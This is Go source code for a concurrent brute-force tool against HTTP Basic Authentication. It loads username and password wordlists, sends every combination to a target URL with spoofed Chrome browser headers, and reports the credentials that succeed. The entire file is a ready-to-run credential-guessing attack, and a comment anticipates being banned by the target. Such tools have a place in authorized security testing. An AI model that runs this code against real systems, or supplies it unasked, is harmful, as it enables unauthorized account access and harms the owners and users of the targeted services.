package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)


const (
	Green = "\033[32m"
	Red   = "\033[31m"
	Reset = "\033[0m"
)


var (
	targetURLStr string
	usersFile    string
	passwordsFile string
	singleUser   string
	singlePassword string
	concurrency  int
)

func init() {
	flag.StringVar(&targetURLStr, "u", "", "Target URL (e.g., http://example.com/admin)")
	flag.StringVar(&usersFile, "U", "", "Path to a file containing usernames list")
	flag.StringVar(&passwordsFile, "P", "", "Path to a file containing passwords list")
	flag.StringVar(&singleUser, "sU", "", "Single username to use")
	flag.StringVar(&singlePassword, "sP", "", "Single password to use")
	flag.IntVar(&concurrency, "c", 10, "Number of concurrent goroutines")
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -u <URL> [-U <users_file> | -sU <single_user>] [-P <passwords_file> | -sP <single_password>]\n\n", os.Args[0])
		flag.PrintDefaults()
	}
}

func main() {
	flag.Parse()

	if targetURLStr == "" {
		fmt.Println(Red + "Error: Target URL (-u) is required." + Reset)
		flag.Usage()
		os.Exit(1)
	}

	targetURL, err := url.Parse(targetURLStr)
	if err != nil {
		fmt.Printf(Red+"Error parsing URL: %v\n"+Reset, err)
		os.Exit(1)
	}

	var users []string
	var passwords []string


	if singleUser != "" {
		users = []string{singleUser}
	} else if usersFile != "" {
		users, err = readLines(usersFile)
		if err != nil {
			fmt.Printf(Red+"Error reading users file: %v\n"+Reset, err)
			os.Exit(1)
		}
	} else {
		fmt.Println(Red + "Error: Either a single user (-sU) or a users file (-U) is required." + Reset)
		flag.Usage()
		os.Exit(1)
	}


	if singlePassword != "" {
		passwords = []string{singlePassword}
	} else if passwordsFile != "" {
		passwords, err = readLines(passwordsFile)
		if err != nil {
			fmt.Printf(Red+"Error reading passwords file: %v\n"+Reset, err)
			os.Exit(1)
		}
	} else {
		fmt.Println(Red + "Error: Either a single password (-sP) or a passwords file (-P) is required." + Reset)
		flag.Usage()
		os.Exit(1)
	}

	if len(users) == 0 || len(passwords) == 0 {
		fmt.Println(Red + "Error: No users or passwords provided after parsing." + Reset)
		os.Exit(1)
	}

	fmt.Printf("Starting bruteforce on %s with %d users and %d passwords...\n", targetURLStr, len(users), len(passwords))

	jobs := make(chan struct{ user, pass string }, concurrency*2) 
	var wg sync.WaitGroup


	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{

				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
				Timeout: 10 * time.Second, 
			}
			for pair := range jobs {
				checkAuth(client, targetURL, pair.user, pair.pass)
			}
		}()
	}

	for _, user := range users {
		for _, pass := range passwords {
			jobs <- struct{ user, pass string }{user, pass}
		}
	}

	close(jobs)
	wg.Wait()  

	fmt.Println("\nBruteforce finished.")
}


func readLines(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func checkAuth(client *http.Client, targetURL *url.URL, username, password string) {
	req, err := http.NewRequest("GET", targetURL.String(), nil)
	if err != nil {
		fmt.Printf(Red+"Error creating request for %s:%s: %v\n"+Reset, username, password, err)
		return
	}

	// B64-enc = username:password
	authString := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))

	req.Header.Set("Host", targetURL.Hostname())
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Authorization", "Basic "+authString)
	req.Header.Set("Sec-Ch-Ua", `"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"`)
	req.Header.Set("Sec-Ch-Ua-Mobile", `?0`)
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36`)
	req.Header.Set("Accept", `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`)
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,fa;q=0.8")
	req.Header.Set("Referer", targetURL.String()) // Referrer should be the target URL itself
	req.Header.Set("Priority", "u=0, i")

	resp, err := client.Do(req)
	if err != nil {

		if strings.Contains(err.Error(), "connection refused") || strings.Contains(err.Error(), "no such host") {

			fmt.Printf(Red+"[500] Server connection error for %s:%s - %v\n"+Reset, username, password, err)
		} else if strings.Contains(err.Error(), "Timeout") {
			fmt.Printf(Red+"[500] Request Timeout for %s:%s - %v\n"+Reset, username, password, err)
		} else {
			fmt.Printf(Red+"[500] General request error for %s:%s: %v\n"+Reset, username, password, err)
		}
		return
	}
	defer resp.Body.Close()


	io.Copy(io.Discard, resp.Body)

	statusCodeFamily := resp.StatusCode / 100

	switch statusCodeFamily {
	case 2: 
		fmt.Printf(Green+"[200] SUCCESS! User: %s Pass: %s\n"+Reset, username, password)
	case 4:
	case 5: 
		fmt.Printf(Red+"[500] Server error for %s:%s - Status: %d. server err, maybe we banned.\n"+Reset, username, password, resp.StatusCode)
	default:

	}
}
